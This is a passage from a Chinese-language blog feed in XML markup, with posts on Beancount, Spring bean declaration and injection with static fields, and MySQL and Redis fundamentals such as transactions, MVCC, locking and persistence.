        <title><![CDATA[开始使用 Beancount]]></title>
        <updated>2020-09-06T02:39:50+08:00</updated>
        <link href="https://blog.stdioa.com/2020/09/using-beancount/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/09/using-beancount/"><![CDATA[<p>使用 Beancount 记账已经有将近两个月了，简单写一写我都做了什么。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/07/15/blog10/</id>
        <title><![CDATA[Spring bean 的声明和注入]]></title>
        <updated>2020-08-25T07:09:07+08:00</updated>
        <link href="http://www.windboy.top/2020/07/15/blog10/"/>
        <content type="text/html" src="http://www.windboy.top/2020/07/15/blog10/"><![CDATA[<p>Spring bean 就是可重用组件，是 Spring 的基础。</p><p>通过 @Component 注解将一个类声明为 bean，交给 Spring 管理，并在需要的时候注入获取实例。这就是 Spring 重要的 IOC 功能。</p><p>今天研究的问题出现在<strong><u>注入</u></strong>这一步：在对一个工具类注入 RedisCache（封装了 RedisTemplate 的工具类），由于工具类使用了静态方法，导致无法获取到注入的 RedisCache。</p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>首先来认识一下 static 可以作用的对象：</p><h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><p>又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。当类被 Java 虚拟机加载的时候，会对 static 变量进行初始化。静态变量存放在 Java 内存区域的方法区。而实例变量每创建一个实例就会产生一个，它与该实例同生共死。</p><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。只能访问所属类的静态字段和静态方法（初始化顺序），方法中不能有 this 和 super 关键字（静态不需要对象）。调用静态方法可以无需创建对象（如果使用对象.静态方法会在编译后翻译为类.静态方法）。如果方法执行的操作不依赖于其类的各个变量和方法，设置为静态使程序的占用空间更小。</p><h4 id="静态语句块"><a href="#静态语句块" class="headerlink" title="静态语句块"></a>静态语句块</h4><p>静态代码块定义在类中方法外，静态代码块在非静态代码块之前执行。该类不管创建多少对象，在类初始化时运行一次。</p><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><p>非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。非静态内部类依赖于外部类的实例，也就是说需要先创建外部类实例，才能用这个实例去创建非静态内部类。而静态内部类不需要。静态内部类不能访问外部类的非静态的变量和方法。</p><h4 id="静态导包"><a href="#静态导包" class="headerlink" title="静态导包"></a>静态导包</h4><p>JDK1.5</p><p>我们这里使用的是<u><strong>静态方法</strong></u>，属于类，而不属于某个实例，调用静态方法时不会创建对象。</p><p>静态方法还提到了初始化顺序：</p><h4 id="初始化顺序"><a href="#初始化顺序" class="headerlink" title="初始化顺序"></a>初始化顺序</h4><p>静态变量和静态语句块 -&gt; 实例变量和普通语句块 -&gt; 构造函数。静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。</p><p><strong>存在继承时的初始化顺序</strong></p><ol><li><p>父类（静态变量、静态语句块）</p></li><li><p>子类（静态变量、静态语句块）</p></li><li><p>父类（实例变量、普通语句块）</p></li><li><p>父类（构造函数）</p></li><li><p>子类（实例变量、普通语句块）</p></li><li><p>子类（构造函数）</p></li></ol><h3 id="bean-的声明"><a href="#bean-的声明" class="headerlink" title="bean 的声明"></a>bean 的声明</h3><p>共有四种方式将将一个<u><strong>类</strong></u>声明为 bean 的注解：</p><h4 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h4><p>通用的注解，可标注任意类为 Spring 组件。如果一个 bean 不知道属于哪个层，可以使用 @Component 注解标注。创建对象，把当前对象存入 Spring 容器中，相当于 XML 的 &lt; bean&gt;。</p><h4 id="Repository"><a href="#Repository" class="headerlink" title="@Repository"></a>@Repository</h4><p>对应持久层，主要用于数据库相关操作。</p><h4 id="Service"><a href="#Service" class="headerlink" title="@Service"></a>@Service</h4><p>对应服务层，主要涉及一些复杂的逻辑。</p><h4 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h4><p>对应控制层，主要用户接受用户请求并返回数据给前端页面。</p><p>@Bean 注解作用于<u><strong>方法</strong></u>，对比一下 @Component ：</p><h4 id="Component-和-Bean-的区别"><a href="#Component-和-Bean-的区别" class="headerlink" title="@Component 和 @Bean 的区别"></a>@Component 和 @Bean 的区别</h4><p>@Component 注解作用于类，而 @Bean 注解作用于方法。</p><p>@Component 通常是通过类路径扫描来自动侦测以及自动装配到 Spring 容器中，@Bean 注解通常是在标有该注解的方法中定义产生这个 bean。</p><p>@Bean 注解比 Component 注解的自定义性更强，而且很多地方我们只能通过 @Bean 注解来注册 bean。比如当我们引用第三方库中的类需要装配到 Spring 容器时，则只能通过 @Bean 来实现。</p><h3 id="bean-的注入"><a href="#bean-的注入" class="headerlink" title="bean 的注入"></a>bean 的注入</h3><p>@Autowired 可以实现自动装配，对象无需自己查找或创建与其关联的其他对象，由容器负责把需要相互协作的对象引用赋予各个对象。</p><h4 id="容器中查询对应类型的-bean"><a href="#容器中查询对应类型的-bean" class="headerlink" title="容器中查询对应类型的 bean"></a>容器中查询对应类型的 bean</h4><ol><li><p>如果查询结果刚好为一个，就将该 bean 装配给 @Autowired 指定的数据。</p></li><li><p>如果查询的结果不止一个，那么 @Autowired 会根据名称来查找。</p></li><li><p>如果上述查找的结果为空，那么会抛出异常。解决方法：使用 required=false。</p></li></ol><p>@Resource、@Inject、@Qualifier 和 @Value 也可以实现同样的装配效果。</p><h4 id="Autowired-和-Resource-之间的区别"><a href="#Autowired-和-Resource-之间的区别" class="headerlink" title="@Autowired 和 @Resource 之间的区别"></a>@Autowired 和 @Resource 之间的区别</h4><ul><li><p>@Autowired 默认是按照类型装配注入的。</p></li><li><p>@Resource 默认是按照名称来装配注入的，只有当找不到与名称匹配的 bean 才会按照类型来装配注入。</p></li></ul><h4 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h4><p>在按照类注入的基础上再根据名称注入。给类注入时不能单独使用，需要配合 @Autowired。给方法和变量注入时可以单独使用。</p><h4 id="Value"><a href="#Value" class="headerlink" title="@Value"></a>@Value</h4><p>基本类型和 String 无法用 @Autowired、@Resource 和 @Qualifier 实现，需要使用 @Value。可以配合 Spring 的 EL 表达式 SpEL。</p><h3 id="问题的分析和解决方案"><a href="#问题的分析和解决方案" class="headerlink" title="问题的分析和解决方案"></a>问题的分析和解决方案</h3><p>了解了 static、bean 的声明和注入后，来看一下出问题的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RedisCache redisCache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendSms</span><span class="params">(String[] phoneNumbers)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    redisCache.setCacheObject(key,code);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来为了 TxsmsUtils.sendSms() 方便而将这个方法设置为 static，在方法内使用 redisCache 时需要 redisCache 也是静态的。</p><p>然而像上面分析的，静态变量属于类，而不属于某个实例，不会由 Spring 注入并创建对象。因此 sendSms() 这个方法中是获取不到 redisCache 对象的，因此出错。</p><p>解决：将 sendSms() 和 redisCache 设置为非静态，即去除 static。</p><p>另外，对于工具类，如果需要使用其他组件，需要将工具类也声明为 Spring bean，交给 Spring 来控制，这样才能获取到组件的实例。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>静态方法中无法进行获取到 Spring bean 的实例，看似直接明了的结论，若不是像我一样在实际开发过程中遇到过 bug，并从头到尾排查一边，真的得很难有完整的理解。</p><p>读万卷书，行万里路。要在懂得理论知识的前提下，积极实践，总结错误。我的这条路才刚刚开始。</p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/06/01/blog9/</id>
        <title><![CDATA[MySQL & Redis 技术分享-下]]></title>
        <updated>2020-08-25T07:09:01+08:00</updated>
        <link href="http://www.windboy.top/2020/06/01/blog9/"/>
        <content type="text/html" src="http://www.windboy.top/2020/06/01/blog9/"><![CDATA[<p>上一篇博客主要谈到 MySQL 的基础知识和高级特性，现在让我们看一下 Redis 部分。</p><h2 id="Redis-基础"><a href="#Redis-基础" class="headerlink" title="Redis 基础"></a>Redis 基础</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Redis 是速度非常快的非关系型内存键值数据库。<br>Redis 和 MySQL 不同之处在于，Redis 用的是 NoSQL。<br>主要用作缓存，缓存目的：</p><ul><li>高性能：操作缓存就是直接操作内存，所以速度相当快。</li><li>高并发：直接操作缓存能够承受的请求是远远大于直接访问数据库的，所以我们可以考虑把数据库中的部分数据转移到缓存中去，这样用户的一部分请求会直接到缓存这里而不用经过数据库。并且缓存是走内存的，内存天然就支撑高并发。</li></ul><h3 id="为什么速度快？"><a href="#为什么速度快？" class="headerlink" title="为什么速度快？"></a>为什么速度快？</h3><ul><li>核心是基于非阻塞的 I/O 多路复用机制，用很少的线程也能快速处理大量任务。</li><li>完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于 HashMap，查找和增删的时间复杂度都是 O(1)。</li><li>采用单线程，数据全都在内存里，单线程去操作就是效率最高的。同时避免了不必要的上下文切换和竞争问题而消耗 CPU，不用去考虑多线程同步和各种锁的问题，如加锁释放锁和死锁导致的性能消耗。另外，单线程天然支持原子操作。</li></ul><p>其他原因：</p><ul><li>数据结构简单，对数据操作也简单。</li><li>底层模型，Redis 构建了自己的 VM 机制。</li><li>C 语言实现。</li><li>客户端与服务端通信使用 Redis 序列化协议 RESP 进行通信。</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>STRING，可以实现常规 key-value 缓存应用和计数。</li><li>LIST，可以实现分页查询和消息队列。</li><li>SET，可以实现共同好友和去重。</li><li>HASH，可以实现存储对象。</li><li>ZSET，可以实现排行榜。ZSET增加了一个权重参数 score，使得集合中的元素能够按 score 进行有序排列。</li></ul><h4 id="Jedis-实现数据类型的基本操作"><a href="#Jedis-实现数据类型的基本操作" class="headerlink" title="Jedis 实现数据类型的基本操作"></a>Jedis 实现数据类型的基本操作</h4><p>同样演示代码在 <a href="https://github.com/Jiebupup/demo" target="_blank" rel="noopener">https://github.com/Jiebupup/demo</a> 中有，介绍了 Jedis 对应上述五个数据类型的操作。 </p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。</p><h4 id="RDB-快照"><a href="#RDB-快照" class="headerlink" title="RDB 快照"></a>RDB 快照</h4><p>创建快照来获得存储在内存里面的数据在某个时间点上的副本，再存放到硬盘上。</p><p>实际操作过程是 fork 一个子进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储。</p><p>可以将快照复制到其它服务器从而创建具有相同数据的服务器副本（就是 Redis 的主从结构），还可以将快照留在原服务器以便重启服务器的时候使用。<br>如果系统发生故障，将会丢失最后一次创建快照之后的数据。<br>如果数据量很大，保存快照的时间会很长。</p><h4 id="AOF-文件"><a href="#AOF-文件" class="headerlink" title="AOF 文件"></a>AOF 文件</h4><p>将写命令添加到 AOF 文件（Append Only File）的末尾。</p><p>设置同步选项：使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。</p><ul><li>always：会严重减低服务器的性能。</li><li>everysec：比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响。</li><li>no：并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。</li></ul><p>AOF 重写：随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。</p><h2 id="Redis-高级特性"><a href="#Redis-高级特性" class="headerlink" title="Redis 高级特性"></a>Redis 高级特性</h2><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><p>Redis 的复制与 MySQL 主从复制类似。<br>Redis 复制水平扩容支撑读高并发，并且从 Redis 2.8 开始支持断点续传，即主从复制过程中，网络连接断掉了，那么可以接着上次复制的地方，继续复制下去。</p><h3 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h3><p>可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。<br>用于实现 Redis 集群的高可用，本身也是作为一个哨兵集群去运行，互相协同工作。</p><h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><p>集群中有多个 master 节点，每个 master 又有多个 slave 节点。和哨兵共同实现了集群的高可用。</p><p>Gossip 协议与集中式协议不同：所有节点都持有一份元数据，不同的节点如果出现了元数据的变更，就不断将元数据发送给其它的节点，让其它节点也进行元数据的变更。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下这一次的技术分享。首先，分享的内容比较便基础，在整理出大量的知识点的同时，我也准备了几个 demo，争取让参与分享的同学巩固一下数据库这块的知识。</p><p>然后就是自己的表达能力需要提升提升，这也是我写这两篇博客的目的，希望自己能在总结和写作中，锻炼自己的表达能力。</p><p>最后还是谈谈我对 MySQL &amp; Redis 学习的看法，我总结的只是部分知识点，MySQL &amp; Redis 的理论知识点偏多，需要记忆的内容也很多。并且在个人项目或者不需要高并发的项目中，很多内容都用不上，用的最多的还是 CRUD。因此我认为熟练地 CRUD 还是很重要的，毕竟是各种项目的基础。如果要想提高自己的能力，对于高阶的知识点还是该记记该背背，更加重要的是写 demo，用代码实战过。  </p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/05/22/blog8/</id>
        <title><![CDATA[MySQL & Redis 技术分享-上]]></title>
        <updated>2020-08-25T07:08:55+08:00</updated>
        <link href="http://www.windboy.top/2020/05/22/blog8/"/>
        <content type="text/html" src="http://www.windboy.top/2020/05/22/blog8/"><![CDATA[<p>这块内容是 5.9 在项目组做的技术分享，由于是第一次做这种技术分享，组内的也有各种大佬，当时内心激动不已，必须写篇博客记录一下。</p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>首先是后端技术栈介绍，这部分在 <a href="http://www.jiebcoder.top/2020/03/01/blog4/" target="_blank" rel="noopener">Java 后端开发技术选型</a> 这篇博客中比较详细的讲述过，主要是计算机网络、操作系统、Spring、分布式、Java、算法和数据库这几部分，引出主题 MySQL &amp; Redis。</p><h2 id="MySQL-基础"><a href="#MySQL-基础" class="headerlink" title="MySQL 基础"></a>MySQL 基础</h2><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>先从 MySQL 开始，MySQL 是典型的 C/S 架构，客户端与服务器的连接简单而言就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start MySQL Server &amp; mysql -uroot -p</span><br></pre></td></tr></table></figure><p>-u 用户名，-p 密码（不建议直接写出来），-h 连接服务器进程所在域名或者 IP 地址（本机则可以忽略），各个参数的摆放顺序没有硬性规定。exit 退出。</p><p>然而客户端与服务器的连接到客户端收到服务器处理结果，并没有看起来的那么简单。下图是一次 SQL 查询在 MySQL 客户端与服务器的执行过程：</p><img src="/images/blog8/图片1.png" /><p>可以看到，这个执行过程可以分为连接管理、解析与优化和存储引擎三块。</p><h3 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h3><p>连接管理中客户端与服务器连接本质上是一个进程间通信的过程，进程的通信方式有：</p><ul><li>TCP/IP</li><li>Windows 下的命名管道或共享内存</li><li>Unix 域套接字</li></ul><p>在客户端程序发起连接的时候，需要携带主机信息、用户名、密码，服务器程序会对客户端程序提供的这些信息进行认证，如果认证失败，服务器程序会拒绝连接。</p><p>每当有一个客户端进程连接到服务器进程时，服务器进程都会创建一个线程来专门处理与这个客户端的交互。当该客户端退出时会与服务器断开连接，服务器并不会立即把与该客户端交互的线程销毁掉，而是把它缓存起来，在另一个新的客户端再进行连接时，把这个缓存的线程分配给该新客户端。这就是数据库连接池，这样就起到了不频繁创建和销毁线程的效果，从而节省开销。<br>介绍几款第三方数据库连接池：Apache commons-dbcp（不活跃）、c3p0（很久没有更新）和 Druid（阿里）。</p><h3 id="解析与优化"><a href="#解析与优化" class="headerlink" title="解析与优化"></a>解析与优化</h3><p>完成连接的建立后，就进入服务器开始解析与优化。</p><h4 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h4><p>首先查询缓存，服务器先检查查询缓存，如果命中了缓存，则立刻返回存储在缓存中的结果。</p><p>当判断缓存是否命中时，MySQL 不会进行解析查询语句，而是直接使用 SQL 语句和客户端发送过来的其他原始信息。所以，任何字符上的不同，例如空格、注释等都会导致缓存的不命中。</p><p>如果查询请求中包含某些系统函数（同样的函数的两次调用会产生不一样的结果，比如函数 NOW）、用户自定义变量和函数、一些系统表，如 mysql、information_schema、performance_schema 数据库中的表，那这个请求就不会被缓存。当查询语句中有一些不确定的数据时，也则不会被缓存。</p><p>查询缓存系统会跟踪查询中涉及的每个表，如果这些表发生了变化，那么和这个表相关的所有缓存数据都将失效。</p><p>缓存同时也带来了额外的开销，从 MySQL5.7.20 开始，不推荐使用查询缓存，并在 MySQL8.0 中删除。</p><h4 id="语法解析"><a href="#语法解析" class="headerlink" title="语法解析"></a>语法解析</h4><p>从指定的文本中提取出我们需要的信息，本质上算是一个编译过程。</p><h4 id="查询优化"><a href="#查询优化" class="headerlink" title="查询优化"></a>查询优化</h4><p>优化的结果就是生成一个执行计划，这个执行计划表明了应该使用哪些索引进行查询，表之间的连接顺序是什么样的。我们可以使用 EXPLAIN 语句来查看某个语句的执行计划。</p><h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><p>MySQL 服务器把数据的存储和提取操作都封装到了一个叫存储引擎的模块里。我们知道表是由一行一行的记录组成的，但这只是一个逻辑上的概念，物理上如何表示记录，怎么从表中读取数据，怎么把数据写入具体的物理存储器上，这都是存储引擎负责的事情。它的功能就是接收上层传下来的指令，然后对表中的数据进行提取或写入操作。</p><p>在 MySQL server 完成了查询优化后，只需按照生成的执行计划调用底层存储引擎提供的 API，获取到数据后返回给客户端就好了。</p><p>进入 MySQL 客户端后可以通过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW ENGINES;</span><br></pre></td></tr></table></figure><p>查看 MySQL 支持的存储引擎，如下图：</p><img src="/images/blog8/截屏2020-05-22下午5.01.32.png" /><p>在这些存储引擎中，比较重要的是 InnoDB 和 MyISAM。</p><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><ul><li>MySQL 默认的事务型存储引擎（5.5 版本后），只有在需要它不支持的特性时，才考虑使用其它存储引擎。</li><li>实现了四个标准的隔离级别，默认级别是可重复读 REPEATABLE READ。</li><li>主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升</li><li>内部优化：从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。</li><li>支持真正的在线热备份，读写混合。其它存储引擎不支持在线热备份。</li><li>默认使用行级锁，在无索引无主键情况更新才会锁表。并发度高。</li><li>支持外键，MVCC，宕机恢复。</li></ul><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><ul><li>设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。</li><li>支持压缩表（对于不会进行修改的表，极大减少磁盘空间占用）和空间数据索引。</li><li>只支持表级锁，不支持行级锁。只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入。</li><li>崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。</li><li>如果指定了延迟更新索引 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。</li><li>MyISAM 更多强调的是性能，每次查询具有原子性，其执行速度比 InnoDB 更快，但不是绝对的。MyISAM 适合 SELECT 密集型的表。</li></ul><p>总结下 InnoDB &amp; MyISAM 的主要区别：事务，并发性 InnoDB支持行级锁，InnoDB 还支持外键和在线热备份，并且崩溃恢复优于MyISAM。MyISAM 简单，强调性能，支持压缩表和空间数据索引。</p><h3 id="数据库事务"><a href="#数据库事务" class="headerlink" title="数据库事务"></a>数据库事务</h3><p>定义：数据库管理系统执行过程中的一个逻辑单位，由一个有限的数据库操作序列构成。</p><h4 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h4><ul><li>原子性 Atomicity：事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。回滚日志 undo log 记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。</li><li>一致性 Consistency：数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对一个数据的读取结果都是相同的。</li><li>隔离性 Isolation：一个事务所做的修改在最终提交以前，对其它事务是不可见的。</li><li>持久性 Durability：一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。系统发生奔溃可以用重做日志 redo log 进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。</li></ul><h4 id="JDBC-实现数据库事务"><a href="#JDBC-实现数据库事务" class="headerlink" title="JDBC 实现数据库事务"></a>JDBC 实现数据库事务</h4><p>JDBC：Java 数据库连接，定义的一套操作所有关系型数据库的接口，不同数据库实现接口，提供 JAR 包。</p><p>JDBC 基本操作：</p><ol><li>注册驱动 DriverManager</li><li>获取连接 Connection</li><li>开启事务</li><li>定义 sql</li><li>获取执行 sql 对象 PreparedStatement</li><li>执行 sql</li><li>事务提交或回滚</li><li>释放资源</li></ol><p>演示代码在 <a href="https://github.com/Jiebupup/demo" target="_blank" rel="noopener">https://github.com/Jiebupup/demo</a> 中有，以转账操作为例，演示了 JDBC 连接等操作和数据库事务。 </p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><h4 id="bin-log"><a href="#bin-log" class="headerlink" title="bin log"></a>bin log</h4><p>二进制日志，用于记录所有更新且提交了数据或者已经潜在更新提交了数据的所有语句。语句以事件的形式保存，它描述数据更改。</p><p>binlog 的作用：</p><ul><li>恢复时能够最大可能地更新数据库，因为二进制日志包含备份后进行的所有更新。</li><li>在主复制服务器上记录所有将发送给从服务器的语句。在后面将介绍的主从复制中会有。</li></ul><h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>回滚日志，实现事务的原子性。在 InnoDB 中还用 undo log 来实现 MVCC。</p><p>在操作任何数据之前，首先将数据备份到 undo log。然后进行数据的修改。如果出现了错误或者用户执行了 ROLLBACK 语句，系统可以利用 undo log 中的备份将数据恢复到事务开始之前的状态。<br>除了可以保证事务的原子性，undo log 也可以用来辅助完成事务的持久化。</p><p>缺陷：每个事务提交前将数据和 undo log 写入磁盘，这样会导致大量的磁盘 I/O，因此性能很低。</p><h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>重做日志，记录新数据的备份。在事务提交前，只要将 redo log 持久化即可，不需要将数据持久化。</p><p>当系统崩溃时，虽然数据没有持久化，但是 redo log 已经持久化。系统可以根据 redo log 的内容，将所有数据恢复到最新的状态。</p><p>redo log 包括两部分：</p><ul><li>一是内存中的日志缓冲 buffer，该部分日志是易失性的。</li><li>二是磁盘上的重做日志文件 file，该部分日志是持久的。</li></ul><h3 id="并发一致性问题"><a href="#并发一致性问题" class="headerlink" title="并发一致性问题"></a>并发一致性问题</h3><ul><li>丢失修改：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改，T2 随后修改，T2 的修改覆盖了 T1 的修改。</li><li>读脏数据：T1 修改一个数据，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。</li><li>不可重复读：T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。</li><li>幻读：T1 读取某个范围（多行）的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。</li></ul><p>并发一致性问题从上到下一致性问题越来越严重。</p><h3 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h3><ul><li>未提交读 READ UNCOMMITTED：事务中的修改，即使没有提交，对其它事务也是可见的。</li><li>提交读 READ COMMITTED：一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。大部分数据库系统的隔离级别都是 READ COMMITTED。</li><li>可重复读 REPEATABLE READ：保证在同一个事务中多次读取同样数据的结果是一样的。MySQL 默认是 REPEATABLE READ。通过 MVCC + Next-Key Locks 防止幻读。</li><li>可串行化 SERIALIZABLE：强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。需要加锁实现，保证同一时间只有一个事务执行。</li></ul><p>对应隔离级别解决并发一致性问题。如图：</p><img src="/images/blog8/图片2.png" /><h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h3><p>多版本并发控制 MVCC 是 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。</p><p>加锁能解决多个事务同时执行时出现的并发一致性问题。在实际场景中读操作往往多于写操作。<br>读写锁能避免不必要的加锁操作，例如读和读没有互斥关系。但读写锁中读和写操作仍然是互斥的。<br>MVCC 利用了多版本的思想，写操作更新最新的版本快照，而读操作去读旧版本快照，没有互斥关系。</p><p>前面讲到脏读和不可重复读最根本的原因是事务读取到其它事务未提交的修改。在事务进行读取操作时，为了解决脏读和不可重复读问题，MVCC 规定只能读取已经提交的快照。</p><p>又分为：快照读和当前读。<br>快照读：MVCC 的 SELECT 操作是快照中的数据，不需要进行加锁操作。<br>当前读：MVCC 会对 INSERT、UPDATE、DELETE 进行加锁操作，从而读取最新的数据。可以看到 MVCC 并不是完全不用加锁，而只是避免了 SELECT 的加锁操作。</p><p>用 undo log 来实现 MVCC：undo log 用来记录版本快照。<br>MVCC 的多版本指的是多个版本的快照，快照存储在 undo log 中，该日志通过回滚指针 ROLL_PTR 把一个数据行的所有快照连接起来。<br>INSERT、UPDATE、DELETE 操作会创建一个日志，并将事务版本号 TRX_ID 写入。DELETE 可以看成是一个特殊的 UPDATE，此时还会额外将 DEL 字段设置为 1。</p><h3 id="Next-Key-Locks"><a href="#Next-Key-Locks" class="headerlink" title="Next-Key Locks"></a>Next-Key Locks</h3><p>可重复读下防止幻读，光 MVCC 是不够的，还需要间隙锁。</p><p>MySQL 中提供了两种封锁粒度：行级锁以及表级锁。</p><p>读写锁：</p><ul><li>写锁，又称排它锁，简写为 X 锁。</li><li>读锁，又称共享锁，简写为 S 锁。都是读时不会互斥。</li></ul><p>InnoDB 行锁是通过给索引上的索引项加锁来实现的。锁粒度小，锁冲突发生的概率最低，支持的并发度也最高。<br>但系统消耗成本也相对较高。加锁慢，会出现死锁。<br>行锁又分为：Record 、Gap 和 Next-Key。</p><ul><li>Record Locks：锁定一个记录上的索引，而不是记录本身。如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。</li><li>Gap Locks：锁定索引之间的间隙，但是不包含索引本身。</li><li>Next-Key Locks：是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录上的索引，也锁定索引之间的间隙。Next-Key Locks锁定一个左开右闭区间。<br>当查询的索引含有唯一属性时，将 Next-Key Locks 降级为 Record Locks。</li></ul><p>除了行级锁和表级锁，BDB 这个数据库还支持页锁，介于两者之间。</p><p>结合刚才讲到 MVCC 和 Next-Key Locks，在可重复读下防止幻读，因为间隙锁锁住了间隙，MVCC 进行正常的快照读。</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>B+ Tree 索引：</p><img src="/images/blog8/图片3.png" /><p>B+ Tree 是查找树，所有叶子节点位于同一层且包含了全部元素的信息，叶子节点用顺序访问指针连接。所有的中间节点元素都同时存在于子节点中，在子节点元素中是最大或最小的元素。</p><p>哈希索引：能以 O(1) 时间进行查找，但是失去了有序性。<br>自适应哈希索引：InnoDB 当某个索引值被使用的非常频繁时，会在 B+ Tree 索引之上再创建一个哈希索引，具备哈希快速查找的功能。</p><p>MyISAM 支持全文索引和空间数据索引，InnoDB 在 MySQL 5.6.4 版本中也开始支持全文索引。</p><h4 id="InnoDB-的-B-Tree-索引"><a 